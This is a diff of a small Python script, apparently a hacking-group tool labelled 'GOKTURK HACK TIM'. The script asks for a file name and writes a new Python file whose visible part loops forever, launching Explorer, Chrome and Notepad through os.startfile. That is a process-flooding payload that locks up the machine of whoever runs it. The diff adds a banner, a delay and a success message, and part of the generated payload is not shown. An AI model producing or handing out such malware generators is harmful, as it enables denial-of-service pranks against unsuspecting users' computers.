@@ -1,4 +1,9 @@
+import time
+
 istek = str(input("Please enter the name of the file to be created: "))
+
+print("Creating... GOKTURK HACK TIM")
+time.sleep(2)
 
 with open(f"{istek}.py", "w") as file:
     file.write('''
@@ -23,3 +28,5 @@ while True:
     os.startfile('explorer')
     os.startfile('chrome')
     os.startfile('notepad')''')
+
+print(f"Creation Completed Successfully {istek}")
